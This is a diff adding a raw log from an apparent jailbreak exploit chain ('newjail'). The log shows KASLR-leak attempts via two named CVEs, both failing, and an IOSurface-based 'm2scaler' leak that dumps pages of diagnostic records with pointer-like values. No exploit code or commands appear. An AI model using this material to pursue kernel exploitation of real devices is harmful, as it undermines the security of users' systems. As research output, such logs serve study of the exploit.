@@ -1,0 +1,393 @@
+=== newjail ready (27 modes) ===
+[UI] mode=24 (FULL — KASLR → ANE → KRW → 86950) target=0x160000000
+[chain] ============================================
+[chain] FULL CHAIN: KASLR → ANE → KRW → 86950
+[chain] ============================================
+[86950] force-reset: torn gate cleared
+[chain] step 1/5: KASLR leaks
+[stage0] === KASLR Leak Stage ===
+[stage0] Attempting CVE-2026-65371 (IOKit gRegistryRoot leak)...
+[stage0] 65371: no IODisplayWrangler/IOConsole service
+[stage0] 65371: FAILED (try lock/unlock screen during attempt)
+[stage0] Attempting CVE-2026-84530 (AIO kn_sdata leak)...
+[stage0] 84530: kqueue fd=3
+[stage0] 84530: aio_read submitted
+[stage0] 84530: proc_pidfdinfo returned 0 (errno=60)
+[stage0] 84530: no kernel pointer leaked after all attempts
+[stage0] 84530: FAILED
+[stage0] Attempting m2scaler (IOSurface KVA leak via framework)...
+[stage0] m2scaler: accel=0x10c5293b0
+[stage0] m2scaler: diag entries A=64 B=256 total=320
+[stage0] m2scaler: rec[0] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[1] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[2] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[3] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[4] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[5] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[6] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[7] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[8] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[9] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[10] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[11] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[12] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[13] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[14] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[15] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[16] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[17] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[18] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[19] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[20] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[21] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[22] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[23] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[24] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[25] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[26] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[27] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[28] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[29] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[30] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[31] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[32] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[33] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[34] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[35] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[36] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[37] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[38] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[39] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[40] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[41] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[42] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[43] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[44] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[45] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[46] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[47] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[48] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[49] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[50] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[51] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[52] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[53] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[54] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[55] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[56] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[57] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[58] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[59] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[60] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[61] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[62] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[63] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[64] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[65] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[66] ev=0x1fcc5c12 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[67] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[68] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[69] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[70] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[71] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[72] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[73] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[74] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[75] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[76] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[77] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[78] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[79] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[80] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[81] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[82] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[83] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[84] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[85] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[86] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[87] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[88] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[89] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[90] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[91] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[92] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[93] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[94] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[95] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x0
+[stage0] m2scaler: rec[96] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[97] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[98] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[99] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[100] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[101] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[102] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[103] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[104] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[105] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[106] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[107] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[108] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[109] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[110] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[111] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[112] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[113] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[114] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[115] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[116] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[117] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[118] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[119] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[120] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[121] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[122] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[123] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[124] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[125] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[126] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[127] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[128] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[129] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[130] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[131] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[132] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0xa7a1e9157d077af @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[133] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[134] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x6ce7d4cdfb5c689d
+[stage0] m2scaler: rec[135] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[136] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[137] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[138] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[139] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[140] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[141] ev=0x1fcc5c12 @04=0xaea64a333621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[142] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[143] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[144] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[145] ev=0xd39c4d70 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[146] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[147] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[148] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[149] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[150] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[151] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[152] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[153] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[154] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[155] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[156] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[157] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[158] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[159] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[160] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[161] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[162] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[163] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[164] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[165] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[166] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[167] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[168] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[169] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[170] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[171] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[172] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[173] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[174] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[175] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[176] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[177] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[178] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[179] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[180] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[181] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[182] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[183] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[184] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[185] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[186] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[187] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[188] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[189] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[190] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[191] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[192] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[193] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[194] ev=0x1fcc5c12 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[195] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[196] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[197] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[198] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[199] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[200] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[201] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[202] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[203] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[204] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[205] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[206] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[207] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[208] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[209] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[210] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[211] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[212] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[213] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[214] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[215] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[216] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[217] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x0
+[stage0] m2scaler: rec[218] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[219] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[220] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[221] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[222] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[223] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[224] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[225] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[226] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[227] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[228] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[229] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[230] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[231] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[232] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[233] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[234] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[235] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[236] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[237] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[238] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[239] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0xa694a7573e4744a3
+[stage0] m2scaler: rec[240] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[241] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[242] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[243] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[244] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[245] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[246] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[247] ev=0xd39c4d70 @04=0xdbd19797b6286ae7 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[248] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[249] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[250] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[251] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[252] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[253] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[254] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[255] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[256] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[257] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[258] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[259] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[260] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[261] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[262] ev=0x0 @04=0x0 @18=0x0 @20=0x0
